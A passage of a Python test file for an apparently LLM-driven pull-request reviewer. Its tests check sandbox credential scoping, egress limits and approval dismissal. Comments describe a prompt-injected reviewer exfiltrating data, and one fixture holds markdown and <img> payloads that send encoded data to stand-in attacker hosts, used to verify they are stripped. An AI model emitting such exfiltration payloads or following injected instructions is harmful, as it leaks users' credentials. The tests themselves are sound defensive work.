import os
import json
import uuid
from pathlib import Path

import pytest
from unittest.mock import MagicMock, patch

from django.utils import timezone

from posthog.models import OAuthAccessToken, Team
from posthog.models.integration import Integration

from products.stamphog.backend.facade.enums import (
    ChannelResolutionSource,
    DigestRunStatus,
    ReviewMode,
    ReviewRunStatus,
    ReviewVerdict,
)
from products.stamphog.backend.logic.channel_resolution import auto_provision_channel
from products.stamphog.backend.logic.github_client import STICKY_COMMENT_MARKER
from products.stamphog.backend.models import DigestChannel, DigestRun, PullRequest, ReviewRun, StamphogRepoConfig
from products.stamphog.backend.tasks.digest import send_daily_digests
from products.stamphog.backend.temporal import activities
from products.stamphog.backend.temporal.activities import (
    MarkReviewFailedInput,
    StamphogReviewInput,
    dismiss_stale_approvals,
    list_in_flight_reviewer_bots,
    mark_review_failed,
    post_verdict,
)
from products.stamphog.backend.temporal.constants import STAMPHOG_SANDBOX_REPO_DIR
from products.stamphog.backend.tests import fakes
from products.stamphog.backend.tests.conftest import PRODUCT_DATABASES, StamphogChain, _run_activity

REPO = "acme/widgets"
INSTALLATION_ID = "2001"
BASE_SHA = "base000"
POLICY_DEFAULTS_DIR = Path(__file__).resolve().parents[1] / "logic" / "policy_defaults"


def _repo_config(team_id: int, *, digest_enabled: bool = True) -> StamphogRepoConfig:
    # Reviews mint the sandbox gateway token under the connecting user, so wire the team's own
    # member in — exactly what sync_installation records in production.
    connected_by = Team.objects.get(id=team_id).organization.members.values_list("id", flat=True).first()
    return StamphogRepoConfig.objects.for_team(team_id).create(
        team_id=team_id,
        repository=REPO,
        installation_id=INSTALLATION_ID,
        enabled=True,
        digest_enabled=digest_enabled,
        connected_by_user_id=connected_by,
    )


def _pr_object(number: int, author: str, head_sha: str) -> dict:
    return {
        "number": number,
        "title": f"PR {number}",
        "body": "Adds a small helper and a test.",
        "html_url": f"https://github.com/{REPO}/pull/{number}",
        "user": {"login": author},
        "head": {"sha": head_sha, "ref": f"feat/pr-{number}"},
        "base": {"sha": BASE_SHA, "ref": "master"},
        "draft": False,
    }


def _pr_files() -> list[dict]:
    return [{"filename": "src/util.py", "status": "modified", "additions": 8, "deletions": 1, "patch": "@@ -1 +1 @@"}]


def _opened_event(number: int, author: str, head_sha: str) -> dict:
    return fakes.build_pull_request_event(
        action="opened",
        installation_id=INSTALLATION_ID,
        repo=REPO,
        number=number,
        title=f"PR {number}",
        body="Adds a small helper and a test.",
        author_login=author,
        head_sha=head_sha,
        head_ref=f"feat/pr-{number}",
        base_sha=BASE_SHA,
    )


def _synchronize_event(number: int, author: str, head_sha: str) -> dict:
    return fakes.build_pull_request_event(
        action="synchronize",
        installation_id=INSTALLATION_ID,
        repo=REPO,
        number=number,
        title=f"PR {number}",
        body="Adds a small helper and a test.",
        author_login=author,
        head_sha=head_sha,
        head_ref=f"feat/pr-{number}",
        base_sha=BASE_SHA,
    )


def _merged_event(number: int, author: str, head_sha: str) -> dict:
    return fakes.build_pull_request_event(
        action="closed",
        installation_id=INSTALLATION_ID,
        repo=REPO,
        number=number,
        title=f"PR {number}",
        body="Adds a small helper and a test.",
        author_login=author,
        head_sha=head_sha,
        head_ref=f"feat/pr-{number}",
        base_sha=BASE_SHA,
        merged=True,
        # Recent, not a fixed date: send_daily_digests bounds a channel's first digest to the previous
        # weekday slot, so a hardcoded merged_at silently ages out of the claim window as the calendar
        # moves and the digest stops posting. now() keeps the merged PR inside the window on any run day.
        merged_at=timezone.now().isoformat(),
        merge_commit_sha=f"merge{number}",
        additions=8,
        deletions=1,
        changed_files=1,
    )


def _make_pr_with_review(
    team_id: int, repo_config: StamphogRepoConfig, *, number: int, author: str, approved_at_sha: str | None
) -> PullRequest:
    pull_request = PullRequest.objects.for_team(team_id).create(
        team_id=team_id,
        repo_config=repo_config,
        pr_number=number,
        author_login=author,
        pr_url=f"https://github.com/{REPO}/pull/{number}",
        head_branch=f"feat/pr-{number}",
    )
    if approved_at_sha is not None:
        ReviewRun.objects.for_team(team_id).create(
            team_id=team_id,
            pull_request=pull_request,
            head_sha=approved_at_sha,
            status=ReviewRunStatus.COMPLETED,
            verdict=ReviewVerdict.APPROVED,
        )
    return pull_request


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_signed_webhook_drives_review_and_posts_approval(team, stamphog_chain: StamphogChain) -> None:
    # Regression guard: the webhook -> capture -> review -> post chain wiring. A signed opened
    # delivery must create the PR + ReviewRun, run the review activities, and post an APPROVE
    # review to GitHub pinned to the reviewed head SHA.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    author, head_sha = "devex-dev", "sha101a"
    recorder.register_pr(REPO, 101, _pr_object(101, author, head_sha), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    status = stamphog_chain.post_webhook(_opened_event(101, author, head_sha), delivery_id=str(uuid.uuid4()))
    assert status == 202

    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=101)
    run = ReviewRun.objects.for_team(team.id).filter(pull_request=pr).latest("created_at")
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.APPROVED

    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
    assert len(approvals) == 1
    assert approvals[0]["body"]["event"] == "APPROVE"
    assert approvals[0]["body"]["commit_id"] == head_sha


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_sandbox_destroy_failure_does_not_mask_a_completed_review(team, stamphog_chain: StamphogChain) -> None:
    # Teardown runs in a finally block after a successful review; if its exception propagated it
    # would replace the success, drop the verdict, and mark the run FAILED.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    author, head_sha = "devex-dev", "sha109a"
    recorder.register_pr(REPO, 109, _pr_object(109, author, head_sha), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"
    stamphog_chain.sandbox_class.destroy_error = RuntimeError("sandbox teardown blew up")

    status = stamphog_chain.post_webhook(_opened_event(109, author, head_sha), delivery_id=str(uuid.uuid4()))
    assert status == 202

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.APPROVED
    assert any(w["kind"] == "approve_review" for w in recorder.github_writes)


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_sandbox_gets_minted_short_lived_credential_and_closed_egress(
    team, user, stamphog_chain: StamphogChain
) -> None:
    # The sandbox runs an LLM over untrusted PR content, so it must never hold a long-lived
    # credential: no raw Anthropic key, not the worker's own gateway key — only a per-run OAuth
    # token minted under the connecting user — and its egress must be fenced to the hosts a
    # review needs, so a prompt-injected reviewer has nowhere to exfiltrate to.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha110a"
    recorder.register_pr(REPO, 110, _pr_object(110, "devex-dev", head_sha), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    worker_env = {"ANTHROPIC_API_KEY": "sk-ant-worker-secret", "AI_GATEWAY_API_KEY": "phs_worker_shared_key"}
    with patch.dict(os.environ, worker_env):
        stamphog_chain.post_webhook(_opened_event(110, "devex-dev", head_sha), delivery_id=str(uuid.uuid4()))

    config = stamphog_chain.sandbox_class.created_configs[0]
    env = config.environment_variables
    assert "ANTHROPIC_API_KEY" not in env
    assert env["AI_GATEWAY_API_KEY"] != "phs_worker_shared_key"

    minted = OAuthAccessToken.objects.get(token=env["AI_GATEWAY_API_KEY"])
    assert minted.user_id == user.id
    # internal_run:read is the server-mint provenance marker the gateway's stamphog route demands
    # (requires_server_credential); llm_gateway:read is the only real capability. Anything broader
    # (task:write from the internal bundle) must never ride into the sandbox.
    assert set(minted.scope.split()) == {"llm_gateway:read", "internal_run:read"}
    assert minted.scoped_teams == [team.id]
    assert minted.expires is not None and minted.expires > timezone.now()

    assert "github.com" in config.outbound_domain_allowlist
    assert "llm-gateway.test" in config.outbound_domain_allowlist
    assert "sha110a" not in config.outbound_domain_allowlist  # sanity: it's a domain list, not env spill


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_hosted_review_fails_closed_without_connecting_user(team, stamphog_chain: StamphogChain) -> None:
    # A repo whose installation was never synced has no identity to mint sandbox credentials
    # under — the run must fail, not fall back to a shared long-lived key.
    config = _repo_config(team.id)
    config.connected_by_user_id = None
    config.save(update_fields=["connected_by_user_id"])
    recorder = stamphog_chain.recorder
    recorder.register_pr(REPO, 111, _pr_object(111, "devex-dev", "sha111a"), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    stamphog_chain.post_webhook(_opened_event(111, "devex-dev", "sha111a"), delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    assert "connecting user" in (run.error or "")


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_failed_run_still_dismisses_the_stale_approval_first(team, stamphog_chain: StamphogChain) -> None:
    # Dismissal runs first in the workflow, so even a run that fails before reaching the sandbox
    # (here: no connecting user to mint credentials) must have already retracted the earlier head's
    # approval — a failure window must never leave a stale approval satisfying required reviews.
    repo_config = _repo_config(team.id)
    repo_config.connected_by_user_id = None
    repo_config.save(update_fields=["connected_by_user_id"])
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=113, author_login="devex-dev"
    )
    prior = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha="sha-old",
        status=ReviewRunStatus.COMPLETED,
        verdict=ReviewVerdict.APPROVED,
        posted_review_id=777,
    )
    recorder = stamphog_chain.recorder
    recorder.register_pr(REPO, 113, _pr_object(113, "devex-dev", "sha113b"), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    stamphog_chain.post_webhook(_synchronize_event(113, "devex-dev", "sha113b"), delivery_id=str(uuid.uuid4()))

    current = ReviewRun.objects.for_team(team.id).filter(pull_request=pull_request).latest("created_at")
    assert current.status == ReviewRunStatus.FAILED
    prior.refresh_from_db()
    assert prior.approval_dismissed_at is not None
    dismissals = [w for w in recorder.github_writes if w["kind"] == "dismiss_review"]
    assert [w["review_id"] for w in dismissals] == [777]


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_hosted_review_fails_closed_without_gateway_instead_of_anthropic_fallback(
    team, stamphog_chain: StamphogChain
) -> None:
    # With no gateway configured the run must fail — never ship the org-wide Anthropic key from
    # the worker env into the sandbox as a fallback.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    recorder.register_pr(REPO, 112, _pr_object(112, "devex-dev", "sha112a"), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    env_without_gateway = {k: v for k, v in os.environ.items() if k != "AI_GATEWAY_URL"}
    env_without_gateway["ANTHROPIC_API_KEY"] = "sk-ant-worker-secret"
    with patch.dict(os.environ, env_without_gateway, clear=True):
        stamphog_chain.post_webhook(_opened_event(112, "devex-dev", "sha112a"), delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    assert "gateway" in (run.error or "").lower()
    assert not stamphog_chain.sandbox_class.created_configs  # no sandbox was ever provisioned


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_missing_policy_files_fall_back_to_server_defaults(team, stamphog_chain: StamphogChain) -> None:
    # A target repo carrying neither .stamphog/policy.yml nor review-guidance.md must still get a
    # sandbox run, with the hosted defaults injected into the checkout. Regression: run_review_in_sandbox
    # used to hard-fail (FAILED run) when a trusted file was absent.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    recorder.policy_files.clear()  # repo carries no policy files at all
    author, head_sha = "devex-dev", "sha404a"
    recorder.register_pr(REPO, 101, _pr_object(101, author, head_sha), _pr_files())

    status = stamphog_chain.post_webhook(_opened_event(101, author, head_sha), delivery_id=str(uuid.uuid4()))
    assert status == 202

    run = (
        ReviewRun.objects.for_team(team.id)
        .filter(pull_request__repo_config=repo_config, pull_request__pr_number=101)
        .latest("created_at")
    )
    assert run.status == ReviewRunStatus.COMPLETED

    injected = {path: payload.decode() for path, payload in stamphog_chain.sandbox_writes}
    assert (
        injected[f"{STAMPHOG_SANDBOX_REPO_DIR}/.stamphog/policy.yml"]
        == (POLICY_DEFAULTS_DIR / "policy.yml").read_text()
    )
    assert (
        injected[f"{STAMPHOG_SANDBOX_REPO_DIR}/.stamphog/review-guidance.md"]
        == (POLICY_DEFAULTS_DIR / "review-guidance.md").read_text()
    )
    # No default steering exists, so nothing must be injected at that path either.
    assert f"{STAMPHOG_SANDBOX_REPO_DIR}/.stamphog/steering.md" not in injected


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_default_branch_steering_is_injected_into_sandbox(team, stamphog_chain: StamphogChain) -> None:
    # A repo declaring .stamphog/steering.md on its default branch must see it injected into the
    # checkout so the engine appends it to the reviewer guidance.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    recorder.policy_files[".stamphog/steering.md"] = "Prefer squash merges.\n"
    author, head_sha = "devex-dev", "sha505a"
    recorder.register_pr(REPO, 101, _pr_object(101, author, head_sha), _pr_files())

    status = stamphog_chain.post_webhook(_opened_event(101, author, head_sha), delivery_id=str(uuid.uuid4()))
    assert status == 202

    injected = {path: payload.decode() for path, payload in stamphog_chain.sandbox_writes}
    assert injected[f"{STAMPHOG_SANDBOX_REPO_DIR}/.stamphog/steering.md"] == "Prefer squash merges.\n"


@pytest.mark.parametrize(
    "prior_head,prior_verdict,prior_dismissed,expect_dismissed",
    [
        ("sha-old", ReviewVerdict.APPROVED, False, True),
        # Same head is NOT spared at workflow start: a same-head re-review (label re-add, reopen)
        # means fresh judgment is pending, and if it refuses, the earlier approval must not keep
        # the PR mergeable. (Skip paths keep the same-head exclusion — no new verdict is coming.)
        ("sha-new", ReviewVerdict.APPROVED, False, True),
        ("sha-old", ReviewVerdict.APPROVED, True, False),
        # A run that posted its approval to GitHub but crashed before the verdict was saved leaves an
        # orphan the sweep must still find — posted_review_id is the marker, not the saved verdict.
        ("sha-old", ReviewVerdict.NONE, False, True),
    ],
    ids=[
        "old_head_dismissed_and_stamped",
        "same_head_dismissed_at_run_start",
        "already_dismissed_not_redone",
        "orphan_without_saved_verdict_swept",
    ],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_dismiss_stale_approvals(
    team,
    stamphog_chain: StamphogChain,
    prior_head: str,
    prior_verdict: ReviewVerdict,
    prior_dismissed: bool,
    expect_dismissed: bool,
) -> None:
    # Every standing stamphog approval must be dismissed and stamped when a new run starts —
    # old-head (unreviewed commits) and same-head (a re-review whose fresh verdict might refuse)
    # alike. Only an already-dismissed approval is left alone.
    repo_config = _repo_config(team.id)
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    prior = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=prior_head,
        status=ReviewRunStatus.COMPLETED if prior_verdict == ReviewVerdict.APPROVED else ReviewRunStatus.FAILED,
        verdict=prior_verdict,
        posted_review_id=555,
        approval_dismissed_at=timezone.now() if prior_dismissed else None,
    )
    current = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha="sha-new", status=ReviewRunStatus.QUEUED
    )

    _run_activity(dismiss_stale_approvals, StamphogReviewInput(review_run_id=str(current.id), team_id=team.id))

    dismissals = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "dismiss_review"]
    prior.refresh_from_db()
    assert len(dismissals) == (1 if expect_dismissed else 0)
    if expect_dismissed:
        assert dismissals[0]["review_id"] == 555
        assert prior.approval_dismissed_at is not None
    elif prior_dismissed:
        assert prior.approval_dismissed_at is not None  # untouched
    else:
        assert prior.approval_dismissed_at is None


@pytest.mark.parametrize(
    "raw_error,expected_stored",
    [
        ("sandbox exploded", "sandbox exploded"),
        # A multi-line raw error (e.g. a yaml.YAMLError echoing .stamphog/policy.yml source lines) must
        # be reduced to its first line — run.error and the event are exposed to stamphog:read, so the
        # continuation lines could leak repository file content.
        ("bad policy at line 3\n  secret_token: sk-live-leak\n  more source", "bad policy at line 3"),
    ],
    ids=["single_line", "multiline_truncated_to_first_line"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_mark_review_failed_captures_failure_event(team, raw_error, expected_stored) -> None:
    # Hosted failures used to be visible only in worker logs; the dashboards need the
    # stamphog_review_failed event next to the review-completed ones. The stored error is scrubbed to
    # its first line so raw exception text can't leak repo file content to stamphog:read.
    repo_config = _repo_config(team.id)
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha="sha-x", status=ReviewRunStatus.REVIEWING
    )

    # ph_scoped_capture is a context manager yielding the capture callable, so the patch
    # provides a context manager whose __enter__ returns the mock to assert against.
    capture_fn = MagicMock()
    with patch("products.stamphog.backend.temporal.activities.ph_scoped_capture") as mock_capture_cm:
        mock_capture_cm.return_value.__enter__.return_value = capture_fn
        mock_capture_cm.return_value.__exit__.return_value = False
        _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, raw_error))

    run.refresh_from_db()
    assert run.status == ReviewRunStatus.FAILED
    assert run.error == expected_stored
    assert capture_fn.call_args.kwargs["event"] == "stamphog_review_failed"
    assert capture_fn.call_args.kwargs["distinct_id"] == "devex-dev"
    props = capture_fn.call_args.kwargs["properties"]
    assert props["stamphog_repo"] == REPO
    assert props["stamphog_error"] == expected_stored


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_reviewer_markdown_images_are_neutralized_before_posting(team, stamphog_chain: StamphogChain) -> None:
    # A prompt-injected reviewer could smuggle an encoded credential into a markdown image URL, and
    # GitHub auto-fetches images through its camo proxy on render — exfiltration around the sandbox
    # egress fence. Images must not survive to the posted body; the surrounding prose must.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha114a"
    recorder.register_pr(REPO, 114, _pr_object(114, "devex-dev", head_sha), _pr_files())
    engine_payload = json.loads(fakes.approved_engine_output().splitlines()[-1])
    engine_payload["review_body"] = (
        'Looks fine. ![exfil](https://evil.example/aGVsbG8=) and <img src="https://evil.example/x"> '
        "plus a reference-style one ![x][leak]\n\n[leak]: https://attacker.example/dG9rZW4=\n\nend."
    )
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=114, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": json.dumps(engine_payload)},
    )

    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
    body = approvals[0]["body"]["body"]
    assert "evil.example" not in body  # inline image and <img> URLs are removed outright
    assert body.count("[image removed]") == 2
    assert "![" not in body  # reference-style images are demoted to plain links (never auto-fetched)
    assert "[x][leak]" in body
    assert body.startswith("Looks fine.") and body.endswith("end.")


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_approval_posted_while_losing_supersession_race_is_dismissed(team, stamphog_chain: StamphogChain) -> None:
    # TOCTOU on the verdict: a delivery can supersede this run after post_verdict's last status
    # recheck but before the terminal save. The approval has already landed on GitHub by then, and
    # the superseding delivery's dismissal sweep ran before the review existed and keys off DB
    # fields this run never got saved — so post_verdict itself must retract the orphan, or an
    # approval nobody owns stands on the PR forever (including after a repo disable, which
    # supersedes active runs the same way).
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha116a"
    recorder.register_pr(REPO, 116, _pr_object(116, "devex-dev", head_sha), _pr_files())
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=116, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": fakes.approved_engine_output().splitlines()[-1]},
    )

    # Inject the race at the post seam: the moment GitHub accepts the approval (right before
    # _comment_id extracts its id), a concurrent delivery flips the run to SUPERSEDED — after every
    # pre-write guard, before the conditional terminal save.
    original_comment_id = activities._comment_id

    def _supersede_then_extract(obj: dict) -> int | None:
        ReviewRun.objects.for_team(team.id).filter(id=run.id).update(status=ReviewRunStatus.SUPERSEDED)
        return original_comment_id(obj)

    with patch.object(activities, "_comment_id", side_effect=_supersede_then_extract):
        result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    assert result == {"verdict": "skipped_superseded"}
    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
    dismissals = [w for w in recorder.github_writes if w["kind"] == "dismiss_review"]
    assert len(approvals) == 1
    assert [d["review_id"] for d in dismissals] == [approvals[0]["id"]]
    run.refresh_from_db()
    assert run.status == ReviewRunStatus.SUPERSEDED  # the losing save never resurrected the run
    assert run.posted_review_id == approvals[0]["id"]  # persisted despite the lost terminal save
    assert run.approval_dismissed_at is not None


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_retry_dismisses_orphan_when_superseded_before_the_fresh_status_recheck(
    team, stamphog_chain: StamphogChain
) -> None:
    # A prior attempt posted the approval (id persisted) and crashed before the terminal save; on
    # the Temporal retry, a same-head re-review supersedes the run between the load and the fresh
    # status recheck. The stale-approval sweep excludes same-head approvals, so this early return
    # must retract the orphan itself — and the persisted id must also stop a duplicate approval.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha117a"
    recorder.register_pr(REPO, 117, _pr_object(117, "devex-dev", head_sha), _pr_files())
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=117, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        posted_review_id=777,
        output={"reviewer_raw": fakes.approved_engine_output().splitlines()[-1]},
    )

    original_parse = activities.parse_reviewer_output

    def _supersede_then_parse(raw: str):
        ReviewRun.objects.for_team(team.id).filter(id=run.id).update(status=ReviewRunStatus.SUPERSEDED)
        return original_parse(raw)

    with patch.object(activities, "parse_reviewer_output", side_effect=_supersede_then_parse):
        result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    assert result == {"verdict": "skipped_superseded"}
    assert [w for w in recorder.github_writes if w["kind"] == "approve_review"] == []
    dismissals = [w for w in recorder.github_writes if w["kind"] == "dismiss_review"]
    assert [d["review_id"] for d in dismissals] == [777]
    run.refresh_from_db()
    assert run.approval_dismissed_at is not None


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_retry_after_head_move_never_rewrites_a_terminal_run(team, stamphog_chain: StamphogChain) -> None:
    # A retry can land after the terminal save committed (the trailing digest stamp crashed) AND the
    # PR head moved meanwhile. The head-moved branch must not rewrite the delivered COMPLETED run to
    # SUPERSEDED — terminal states are history; the approval itself is the sweep's job at the next
    # delivery, not this retry's.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    recorder.register_pr(REPO, 118, _pr_object(118, "devex-dev", "sha-newer"), _pr_files())
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=118, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha="sha-older",
        status=ReviewRunStatus.COMPLETED,
        verdict=ReviewVerdict.APPROVED,
        posted_review_id=555,
        output={"reviewer_raw": fakes.approved_engine_output().splitlines()[-1]},
    )

    result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    assert result == {"verdict": "skipped_head_moved"}
    run.refresh_from_db()
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.APPROVED
    assert [w for w in recorder.github_writes if w["kind"] == "dismiss_review"] == []


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_bot_eyes_on_a_later_reactions_page_still_counts_as_in_flight(team, stamphog_chain: StamphogChain) -> None:
    # Anyone can react on a public PR, so an author could bury the trusted bot's fresh 👀 past the
    # first page with junk reactions; a first-page-only fetch would treat the bot as absent and let
    # stamphog approve while that reviewer is still mid-review.
    repo_config = _repo_config(team.id)
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=115, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha="sha115a", status=ReviewRunStatus.QUEUED
    )
    now_iso = timezone.now().strftime("%Y-%m-%dT%H:%M:%SZ")
    junk = [{"user": {"login": f"rando-{i}"}, "content": "heart", "created_at": now_iso} for i in range(100)]
    eyes = {"user": {"login": "greptile-apps[bot]"}, "content": "eyes", "created_at": now_iso}
    stamphog_chain.recorder.pr_reactions[(REPO, 115)] = [*junk, eyes]

    result = _run_activity(
        list_in_flight_reviewer_bots, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id)
    )

    assert result["in_flight"] == ["greptile-apps[bot]"]


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_mark_review_failed_dismisses_an_orphaned_approval(team, stamphog_chain: StamphogChain) -> None:
    # post_verdict can approve on GitHub, persist the id, and then exhaust retries before the
    # terminal save — the workflow's failure path is the last chance to retract that approval:
    # without a future delivery, nothing else ever sweeps a FAILED run's orphan.
    repo_config = _repo_config(team.id)
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=119, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha="sha119a",
        status=ReviewRunStatus.REVIEWING,
        posted_review_id=888,
    )

    with patch("products.stamphog.backend.temporal.activities.ph_scoped_capture") as mock_capture_cm:
        mock_capture_cm.return_value.__enter__.return_value = MagicMock()
        mock_capture_cm.return_value.__exit__.return_value = False
        _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, "terminal save kept failing"))

    dismissals = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "dismiss_review"]
    assert [d["review_id"] for d in dismissals] == [888]
    run.refresh_from_db()
    assert run.status == ReviewRunStatus.FAILED
    assert run.approval_dismissed_at is not None


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_mark_review_failed_never_rewrites_a_terminal_run(team) -> None:
    # post_verdict saves COMPLETED (approval already posted to GitHub) before its trailing digest
    # stamp; a failure in that tail must not rewrite the delivered outcome to FAILED.
    repo_config = _repo_config(team.id)
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=102, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha="sha-y",
        status=ReviewRunStatus.COMPLETED,
        verdict=ReviewVerdict.APPROVED,
    )

    with patch("products.stamphog.backend.temporal.activities.ph_scoped_capture"):
        _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, "late digest stamp blew up"))

    run.refresh_from_db()
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.APPROVED
    assert not run.error


def _refused_engine_output() -> str:
    payload = {
        "final_verdict": "REFUSED",
        "reviewer": {"reasoning": "Touches risky territory without assurance.", "issues": ["billing change"]},
        "gates": [{"name": "size", "passed": True}],
        "review_body": "Refused by stamphog.",
    }
    return json.dumps(payload)


@pytest.mark.parametrize(
    "review_mode,expect_strip",
    [(ReviewMode.LABEL, True), (ReviewMode.ALL, False)],
    ids=["label_mode_strips_trigger_label", "all_mode_leaves_labels_alone"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_refused_verdict_strips_trigger_label_only_in_label_mode(
    team, stamphog_chain: StamphogChain, review_mode: ReviewMode, expect_strip: bool
) -> None:
    # Action parity: in label-triggered mode a refusal removes the trigger label so the author
    # explicitly re-requests the next review; in ALL mode labels are never touched.
    repo_config = _repo_config(team.id)
    repo_config.review_mode = review_mode
    repo_config.save()
    head_sha = "sha-refused"
    stamphog_chain.recorder.register_pr(REPO, 101, _pr_object(101, "devex-dev", head_sha))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": _refused_engine_output()},
    )

    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    run.refresh_from_db()
    assert run.verdict == ReviewVerdict.REFUSED
    label_removals = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "remove_label"]
    if expect_strip:
        assert label_removals == [{"kind": "remove_label", "repo": REPO, "number": 101, "label": "stamphog"}]
    else:
        assert label_removals == []


@pytest.mark.parametrize(
    "review_enabled,approved_at_sha,expected_audience_key",
    [
        (True, "sha-merged", "team-devex"),
        (True, None, ""),
        (True, "sha-earlier", ""),
        # Digest-only mode (review off, digest on): approvals can't exist by construction, so
        # every merge is digest-eligible — gating on approval would keep these repos out of
        # Slack forever.
        (False, None, "team-devex"),
    ],
